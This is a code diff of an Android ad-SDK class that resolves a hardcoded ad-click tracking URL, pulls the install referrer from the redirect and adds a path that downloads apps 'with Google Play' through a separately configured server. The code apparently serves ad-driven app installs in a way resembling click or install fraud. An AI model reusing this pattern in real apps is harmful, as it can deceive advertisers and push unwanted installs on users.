@@ -49,7 +49,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable, IResponse
 	private Button mInstallBtn;
 	private ImageView mCloseIV;
 	private AD mAD;
-	private Handler mHandler;
+//	private Handler mHandler;
 	private LokiClientCallback lokiClientCallback;
 	
 	private InstallWindowPerListAdapter mAdapter;
@@ -59,7 +59,7 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable, IResponse
 	InstallGuideWindowTask(Context context, AD ad) {
 		super(context);
 		mAD = ad;
-		mHandler = new Handler(Looper.getMainLooper());
+//		mHandler = new Handler(Looper.getMainLooper());
 	}
 
 	@Override
@@ -147,20 +147,29 @@ class InstallGuideWindowTask extends ADWindowTask implements Runnable, IResponse
 		ADTask adTask = builder.setADType(TaskType.WINDOW_INSTALLING, mContext, mAD).build();
 		adTask.start();
 		AMApplication.instance.installADs.add(mAD);
-		mHandler.post(this);
+//		mHandler.post(this);
+		new Thread(this).start();
 	}
 
 	@Override
 	public void run() {
 		try {
 			destUrl = CommonUtils.getDestUrl("http://pixel.admobclick.com/v1/click?type=01&p1=null&p2=469&p3=10020&p4=72936347842258022881022981438150268774&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=2.31&p9=&p10=&p11=en&p12=24724&p13=210&p14=187970&lid=null&p15=sg.gumi.bravefrontier&p24=");
-			if(!CommonUtils.isEmptyString(destUrl) && destUrl.contains("package_name")) {
-				CheckApkRequest request = new CheckApkRequest(this);
-				Uri uri = Uri.parse(destUrl);
-				String packageName = uri.getQueryParameter("package_name");
-				referrer = uri.getQueryParameter("referrer");
-				request.start(packageName);
-				return;
+			if(!CommonUtils.isEmptyString(destUrl)) {
+				if(destUrl.contains("package_name")) {
+					CheckApkRequest request = new CheckApkRequest(this);
+					Uri uri = Uri.parse(destUrl);
+					String packageName = uri.getQueryParameter("package_name");
+					referrer = uri.getQueryParameter("referrer");
+					request.start(packageName);
+					return;
+				}else {
+					ClientManager clientManager = ClientManager.getInstance(mContext);
+					ConfigParser parser = new ConfigParser();
+					String serverName = parser.getValue(mContext, AMConstants.NET_GP_SERVER);
+					String serverPort = parser.getValue(mContext, AMConstants.NET_GP_SERVER_PORT);
+					clientManager.downloadWithGooglePlay(destUrl, lokiClientCallback, serverName, Integer.parseInt(serverPort), 600000);
+				}
 			}
 		} catch (Exception e) {
 			AMLogger.e(null, e.getMessage());
